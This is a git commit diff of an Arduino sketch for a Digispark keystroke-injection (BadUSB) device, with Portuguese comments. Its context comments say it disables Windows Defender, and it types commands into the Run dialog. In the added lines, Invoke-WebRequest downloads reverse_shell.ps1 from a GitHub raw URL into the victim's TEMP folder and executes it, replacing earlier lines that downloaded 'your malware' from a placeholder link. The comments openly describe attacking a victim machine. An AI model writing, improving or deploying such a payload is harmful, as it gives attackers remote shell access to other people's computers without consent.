93e68f8cf4218fd119ae9450d93454db0ecce813
CR <jfmamjjasond_mtwtfss_@outlook.com>
2024-09-24 11:38:12 -0300

    Update RubberDuck_Digispark.ino

--- RubberDuck_Digispark.ino
+++ RubberDuck_Digispark.ino
@@ -3,12 +3,13 @@
 
 void setup() {
   pinMode(0,OUTPUT); 
-  pinMode(1,OUTPUT); 
+  pinMode(1,OUTPUT);     
 }
-
 void loop() {
-  pisca_led(100); 
+  pisca_led(100);
+  
   //  Desliga o Windows Defender
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //  Minimiza todas as janelas abertas
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //  Abre o executar
@@ -45,15 +46,11 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboardPtBr.println("cd $env:TEMP"); //  Entra no diretório TEMP da maquina da vitima
   DigiKeyboard.delay(500);
-  DigiKeyboardPtBr.println("Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe' -OutFile 'python-installer.exe'");  //  Baixa o Python na maquina da vitima
-  DigiKeyboard.delay(10000);
-  DigiKeyboardPtBr.println("Start-Process -Wait -FilePath '.\python-installer.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1'");  //  Instala o Python
-  DigiKeyboard.delay(10000);
-  DigiKeyboardPtBr.println("Invoke-WebRequest -Uri 'Link-do-seu-repositório-aqui.com.br' -OutFile 'seu-arquivo-python.py'");  //  Baixa o seu malware na maquina da vitima
+  DigiKeyboardPtBr.println("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/cosmosredshiftsete/RubberDuck_Digispark/refs/heads/main/reverse_shell.ps1' -OutFile 'reverse_shell.ps1'");  //  Baixa a shell reversa na maquina da vitima
   DigiKeyboard.delay(500);
   DigiKeyboardPtBr.println("cls");
   //  Executa seu Malware na maquina
-  DigiKeyboard.print("python seu-arquivo-python.py");
+  DigiKeyboard.print("reverse_shell.ps1");
   DigiKeyboard.delay(500);
   DigiKeyboard.print("\t");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -72,5 +69,5 @@ void pisca_led(int velocidade){
     digitalWrite(0, LOW); 
     digitalWrite(1, LOW); 
     DigiKeyboardPtBr.delay(velocidade);  
-  }
+  } 
 }
